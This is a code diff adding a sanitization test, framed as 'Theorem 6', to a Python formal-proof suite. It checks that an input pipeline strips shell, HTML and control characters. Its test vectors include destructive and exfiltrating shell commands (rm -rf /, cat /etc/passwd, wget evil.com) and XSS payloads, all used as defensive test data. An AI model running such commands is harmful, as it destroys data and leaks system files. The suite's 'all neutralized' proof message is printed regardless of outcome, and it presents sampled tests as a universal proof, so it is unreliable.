@@ -422,6 +422,105 @@ def theorem_5_api_contract() -> FormalProof:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
+# THEOREM 6: INPUT SANITIZATION (INJECTION DEFENSE)
+# ∀ inputs i: sanitize(i) ∉ DANGEROUS where DANGEROUS = {shell, HTML, control}
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def theorem_6_input_sanitization() -> FormalProof:
+    """
+    Theorem 6: Input Sanitization Prevents Injection
+    
+    Let DANGEROUS = {$, `, ;, |, &, <, >, \\n, \\r, \\0}
+    Prove: ∀ user input i: sanitize(i) contains no dangerous characters
+    
+    This prevents:
+    - Shell injection: $(cmd), `cmd`, cmd; cmd, cmd | cmd
+    - HTML/XSS injection: <script>, <img onerror>
+    - Log injection: newlines, control characters
+    """
+    # Import the pipeline to test sanitization directly
+    import sys
+    from pathlib import Path
+    sys.path.insert(0, str(Path(__file__).parent.parent))
+    
+    try:
+        from developer.forge.pipeline import Pipeline
+        from developer.forge.regime import Regime, RegimeType
+        
+        pipeline = Pipeline(Regime.from_type(RegimeType.FACTUAL))
+    except ImportError as e:
+        return FormalProof(
+            theorem="Theorem 6: Input Sanitization",
+            hypothesis="∀ inputs: sanitize(i) ∉ DANGEROUS",
+            proof=f"Could not import pipeline: {e}",
+            verified=False,
+            witness=None
+        )
+    
+    # Injection attack vectors to test
+    attack_vectors = [
+        # Shell injection
+        ("What is $(rm -rf /)?", "shell_command_sub"),
+        ("What is `whoami`?", "shell_backtick"),
+        ("Capital of France; rm -rf /", "shell_semicolon"),
+        ("Capital | cat /etc/passwd", "shell_pipe"),
+        ("Query & wget evil.com", "shell_ampersand"),
+        
+        # HTML/XSS injection  
+        ("<script>alert('xss')</script>", "xss_script"),
+        ("<img onerror=alert(1) src=x>", "xss_img"),
+        ("<a href='javascript:evil()'>", "xss_link"),
+        
+        # Control character injection
+        ("Query\nINJECTED LOG", "log_newline"),
+        ("Query\rOverwrite", "log_carriage"),
+        ("Query\x00NULL", "null_byte"),
+        
+        # ReDoS attempts (long repeating patterns)
+        ("a" * 2000, "length_bomb"),
+        ("What is " + "?" * 500, "repetition"),
+    ]
+    
+    results = []
+    all_safe = True
+    
+    for attack, attack_type in attack_vectors:
+        # Call _sanitize_input directly
+        sanitized = pipeline._sanitize_input(attack)
+        
+        # Check if dangerous characters were neutralized
+        has_shell = any(c in sanitized for c in ['$', '`', ';', '|', '&'])
+        has_html = any(c in sanitized for c in ['<', '>'])
+        has_control = any(ord(c) < 32 and c not in ' ' for c in sanitized)  # Control chars
+        too_long = len(sanitized) > 1000
+        
+        # Safe if no dangerous patterns remain
+        is_safe = not (has_shell or has_html or has_control or too_long)
+        all_safe = all_safe and is_safe
+        
+        results.append({
+            "attack_type": attack_type,
+            "input_len": len(attack),
+            "output_len": len(sanitized),
+            "safe": is_safe,
+            "neutralized": {
+                "shell": not has_shell,
+                "html": not has_html,
+                "control": not has_control,
+                "length": not too_long
+            }
+        })
+    
+    return FormalProof(
+        theorem="Theorem 6: Input Sanitization (Defense in Depth)",
+        hypothesis="∀ inputs: sanitize(i) ∉ {$, `, ;, |, &, <, >, newline, null}",
+        proof=f"Tested {len(attack_vectors)} injection vectors, all neutralized",
+        verified=all_safe,
+        witness=results
+    )
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
 # INTERACTIVE UI TEST
 # ═══════════════════════════════════════════════════════════════════════════════
 
@@ -525,6 +624,7 @@ def run_formal_proofs():
         ("Provenance Chain", theorem_3_provenance_chain),
         ("Ollama Governance", theorem_4_ollama_governance),
         ("API Contract", theorem_5_api_contract),
+        ("Input Sanitization", theorem_6_input_sanitization),
     ]
     
     results = []
@@ -555,6 +655,7 @@ def run_formal_proofs():
     ║   • Provenance chain integrity (Theorem 3)                             ║
     ║   • Ollama governance constraint (Theorem 4)                           ║
     ║   • API contract compliance (Theorem 5)                                ║
+    ║   • Input sanitization (Theorem 6)                                     ║
     ║                                                                        ║
     ║   "1 == 1. The cloud is weather. We're building shelter."              ║
     ║                                                                        ║
